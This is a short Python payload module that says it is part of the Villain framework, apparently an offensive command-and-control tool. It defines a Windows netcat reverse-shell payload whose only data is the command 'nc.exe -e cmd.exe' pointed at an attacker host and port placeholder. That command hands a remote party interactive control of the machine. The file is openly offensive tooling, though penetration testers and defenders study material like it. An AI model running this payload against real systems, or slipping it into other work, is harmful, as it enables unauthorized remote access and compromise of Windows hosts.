# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows Netcat Cmd Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Netcat Cmd Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'netcat-cmd-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nc.exe -e cmd.exe *LHOST* *LPORT*"
